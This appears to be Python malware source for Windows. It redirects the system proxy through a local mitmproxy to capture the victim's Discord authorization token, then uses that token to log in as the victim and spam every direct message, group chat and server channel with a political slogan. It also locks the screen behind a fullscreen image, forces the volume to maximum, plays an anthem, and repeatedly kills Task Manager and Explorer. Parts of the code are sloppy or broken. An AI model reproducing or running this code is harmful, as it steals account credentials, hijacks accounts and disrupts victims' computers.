import ctypes
import logging
import os
import threading
# --------------------------------------------------------
# ------------------------LaunchingUkrainizaciya---------------
import time
# ---------------------ProxySetup---------------------
import winreg as reg
from ctypes import cast, POINTER
from io import BytesIO

import keyboard
# -------------------------------------------------------
# ------------------------ProcessController---------------
import psutil
import pyautogui
# ---------------------ImageController--------------------
import pygame
# --------------------------------------------------------
# ---------------------DiscordManager------------------
import asyncio
import discord
# -----------------------------------------------------
# --------------------------WindowsController-------------
import pygetwindow
import requests
import urllib3
import win32api
import win32con
import win32security
from PIL import Image
from comtypes import CLSCTX_ALL
from mitmproxy import options
from mitmproxy.addonmanager import Loader
from mitmproxy.tools.dump import DumpMaster
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import LaunchingUkrainizaciya

# ----------------------------------------------------
# ---------------------tokengraber---------------------
# -----------------------------------------------------

# ---------------------------------------------------




logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("requests.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


# ---------------------ProxySetup---------------------
class ProxySetup:
    def __init__(self):
        ...

    @classmethod
    def set_proxy(cls, proxy) -> None:
        internet_settings = reg.OpenKey(reg.HKEY_CURRENT_USER,
                                        r'Software\Microsoft\Windows\CurrentVersion\Internet Settings',
                                        0, reg.KEY_ALL_ACCESS)

        reg.SetValueEx(internet_settings, 'ProxyServer', 0, reg.REG_SZ, proxy)
        reg.SetValueEx(internet_settings, 'ProxyEnable', 0, reg.REG_DWORD, 1)

        reg.CloseKey(internet_settings)

    @classmethod
    def deactivate_proxy(cls) -> None:
        internet_settings = reg.OpenKey(reg.HKEY_CURRENT_USER,
                                        r'Software\Microsoft\Windows\CurrentVersion\Internet Settings',
                                        0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(internet_settings, 'ProxyEnable', 0, reg.REG_DWORD, 0)

        reg.CloseKey(internet_settings)


# --------------------------------------------------------
# ---------------------DiscordManager------------------
class DiscordManager:
    @staticmethod
    def Start(cls):
        with open("token.txt", "r") as file:
            TOKEN = file.read()

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        client = discord.Client(loop=loop)

        @client.event
        async def on_ready():
            print('Logged in as')
            print(client.user.name)
            print(client.user.id)
            print('------')

            for channel in client.private_channels:
                if isinstance(channel, discord.GroupChannel):
                    print(f'Group Chat: {channel.name}')
                    for member in channel.recipients:
                        print(f'Member: {member.name}')
                elif isinstance(channel, discord.DMChannel):
                    print(f'Direct Message with: {channel.recipient.name}')
                await channel.send("Слава Украине! 💙💛🇺🇦")

            for guild in client.guilds:
                print(f'Guild Name: {guild.name}')
                print(f'Guild ID: {guild.id}')
                for channel in guild.text_channels:
                    print(f'Text Channel: {channel.name}')
                    try:
                        await channel.send("Слава Украине! 💙💛🇺🇦")
                    except:
                        ...
                print('------')

        client.run(TOKEN, bot=False)


# -----------------------------------------------------
# ---------------------tokengraber---------------------

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("requests.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)
finished = False


class RequestLogger:
    def load(self, loader: Loader):
        loader.add_option(
            name="listen_host", typespec=str, default="127.0.0.1",
            help="Proxy listen address"
        )
        loader.add_option(
            name="listen_port", typespec=int, default=8080,
            help="Proxy listen port"
        )

    def request(self, flow):
        global finished
        request = flow.request
        for header, value in request.headers.items():
            if header == "authorization" and "discord.com" in request.url:
                logger.info("---------------------------------------")
                logger.info(f"DETECTED TOKEN DISCORD: {value}")
                logger.info("---------------------------------------")
                with open("token.txt", "w") as file:
                    file.write(value)
                finished = True
            else:
                logger.info(f"URL: {flow.request.url}")
                logger.info("Request Headers:")
                for key, value in flow.request.headers.items():
                    logger.info(f"{key}: {value}")
                logger.info("\n")


class tokengraber:
    @classmethod
    async def start(cls):
        global finished
        opts = options.Options(listen_host='127.0.0.1', listen_port=8080)
        pconf = opts.keys()
        m = DumpMaster(opts)

        m.addons.add(RequestLogger())

        try:
            asyncio.create_task(m.run())
            while finished == False:
                await asyncio.sleep(1)
            logger.info("Closing TokenGraber Proxy")
            m.shutdown()


        except SystemExit:
            ...


# --------------------------------------------------------

# ---------------------ImageController--------------------
class ImageController:

    @classmethod
    def play_music(cls, music_url):
        song_file = "song.mp3"

        # Скачиваем песню
        response = requests.get(music_url, verify=False)
        with open(song_file, "wb") as f:
            f.write(response.content)

        pygame.mixer.init()
        pygame.mixer.music.load(song_file)
        pygame.mixer.music.play(-1)

    @classmethod
    def show_image(cls, image_url):
        pygame.init()

        screen_info = pygame.display.Info()
        screen_width = screen_info.current_w
        screen_height = screen_info.current_h
        screen = pygame.display.set_mode((screen_width, screen_height), pygame.FULLSCREEN)
        pygame.display.set_caption("Ukrainization")
        response = requests.get(image_url, verify=False)
        image = Image.open(BytesIO(response.content))

        image = image.convert("RGB").resize((screen_width, screen_height))

        pygame_image = pygame.image.fromstring(image.tobytes(), image.size, "RGB")
        screen.blit(pygame_image, (0, 0))
        pygame.display.update()

        while True:
            for event in pygame.event.get():
                ...

        pygame.quit()

    @classmethod
    def download_image(cls, url, save_path):
        response = requests.get(url)
        if response.status_code == 200:
            with open(save_path, 'wb') as f:
                f.write(response.content)
            return True
        else:
            return False

    @classmethod
    def set_wallpaper(cls, image_path):
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)


# --------------------------------------------------------

# ------------------------ProcessController---------------

class ProcessController:
    @classmethod
    def kill_task_manager(cls):
        for proc in psutil.process_iter():
            if proc.name() == "Taskmgr.exe":
                print("Диспетчер задач найден. Закрываю диспетчер задач...")
                proc.kill()
                print("Диспетчер задач успешно закрыт.")
                return
        print("Диспетчер задач не найден.")

    @classmethod
    def kill_explorer_manager(cls):
        for proc in psutil.process_iter():
            if proc.name() == "explorer.exe":
                print("Explorer найден. Закрываю диспетчер задач...")
                proc.kill()
                print("Explorer успешно закрыт.")
                return
        print("Explorer не найден.")


# --------------------------------------------------------
# --------------------------WindowsController-------------

class WindowsController:
    @classmethod
    def restor_window(cls):
        window = pygetwindow.getWindowsWithTitle("Ukrainization")[0]
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)

        volume = cast(interface, POINTER(IAudioEndpointVolume))
        while True:
            try:
                volume.SetMasterVolumeLevelScalar(1.0, None)
                window.restore()
            except:
                time.sleep(1)
                window = pygetwindow.getWindowsWithTitle("Ukrainization")[0]
                devices = AudioUtilities.GetSpeakers()
                interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)

                volume = cast(interface, POINTER(IAudioEndpointVolume))
# --------------------------------------------------------
# ------------------------LaunchingUkrainizaciya---------------


def start():
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    image_url = "https://img.freepik.com/free-vector/ukrainian-flag-pattern-vector_53876-162417.jpg"
    music_url = "https://muz8.z3.fm/d/18/gimn_ukraini_-_shche_ne_vmerla_ukrani_(zf.fm).mp3?download=force"
    filename = 'icon.ico'
    image_path = os.path.join(os.getcwd(), "wallpaper.ico")

    current_pid = win32api.GetCurrentProcessId()
    hProcess = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, current_pid)

    # Получаем дескриптор токена процесса
    hToken = win32security.OpenProcessToken(hProcess, win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY)

    # Запрещаем выключение компьютера через групповую политику
    SE_SHUTDOWN_NAME = 'SeShutdownPrivilege'
    shutdown_privilege = win32security.LookupPrivilegeValue(None, SE_SHUTDOWN_NAME)
    privileges = [(shutdown_privilege, win32security.SE_PRIVILEGE_ENABLED)]
    win32security.AdjustTokenPrivileges(hToken, False, privileges)

    if ImageController.download_image(image_url, image_path):
        ImageController.set_wallpaper(image_path)
        print("Обои успешно установлены!")
    else:
        print("Не удалось загрузить изображение.")

    music_thread = threading.Thread(target=ImageController.play_music, args=(music_url,))
    image_thread = threading.Thread(target=ImageController.show_image, args=(image_url,))
    restor = threading.Thread(target=WindowsController.restor_window)

    music_thread.start()
    image_thread.start()

    time.sleep(1)
    restor.start()

    while True:
        try:
            while True:
                ProcessController.kill_task_manager()
                ProcessController.kill_explorer_manager()
                pyautogui.moveTo(12, 34, )
                keyboard.write("Украинизация")
        except:
            ...


# ----------------------------------------------------------


# ---------------------StartPoint-------------------------

async def main():
    logger.info("Proxy installation.")

    proxy = "http=localhost:8080;https=localhost:8080"
    ProxySetup.set_proxy(proxy)

    logger.info("The proxy is installed and the settings are saved.")

    await tokengraber.start()

    while os.path.exists("token.txt") == False:
        time.sleep(1)

    logger.info("Deactivating a proxy.")
    ProxySetup.deactivate_proxy()

    logger.info("Starting Discord Bot")


if __name__ == "__main__":
    asyncio.run(main())
    logger.info("Build Thread")
    thread = threading.Thread(target=LaunchingUkrainizaciya.start)
    logger.info("Starting Thread")
    thread.start()
    DiscordManager.Start()
